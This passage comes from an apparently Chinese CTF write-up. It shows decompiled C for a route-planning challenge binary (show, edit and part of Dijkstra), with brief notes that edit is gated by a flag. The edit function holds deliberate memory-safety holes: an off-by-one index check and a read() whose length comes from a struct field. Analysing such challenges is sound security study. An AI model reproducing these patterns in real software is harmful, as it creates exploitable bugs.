punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Distance:%d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token function\">LODWORD</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Note:%s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">return</span> v0<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>使用 printf 的 show 函数</p>\n<p><code>edit</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-80h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-7Ch]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-78h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> city_name<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-74h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-70h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> num<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-6Ch]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  _DWORD <span class=\"token operator\">*</span>v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-68h]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-60h]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v9<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+78h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v9 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>edit_flag1 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You've already edited it!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>edit_flag2 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You don't need to edit anymore.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"From where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  city_name <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"To where?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>city_name <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> v5 <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>       <span class=\"token operator\">||</span> v5 <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> city_name <span class=\"token operator\">==</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      v8<span class=\"token punctuation\">[</span>v1<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> v1<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Route%d: %d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>j<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v8<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which one do you want to change?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    num <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> num <span class=\"token operator\">></span> v1 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"How far?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    v7 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>v8<span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    v7<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Note:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> v7 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v7<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">79</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  edit_flag1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token keyword\">return</span> v9 <span class=\"token operator\">-</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>edit 的进入有条件，需要 edit_flag2 置 1</p>\n<p><code>Dijkstra</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">Dijkstra</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-D0h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-CCh]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> k<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-C8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">int</span> m<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-C4h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> city_name<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-C0h]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-BCh]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">int</span> v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-B8h]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">int</span> v8<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Ch] [rbp-B4h]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">int</span> v9<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-B0h] BYREF</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">int</span> v10<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+40h] [rbp-90h] BYREF</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">int</span> v11<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+60h] [rbp-70h]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v12<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+C8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  v12 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  v11<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>      v7 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      v8 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v7 <span class=\"token operator\">+</span> v8<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v7 <span class=\"token operator\">+</span> v8<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v8 <span class=\"token operator\">+</span> v7<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>routes<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    v9<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">9999</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    v10<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 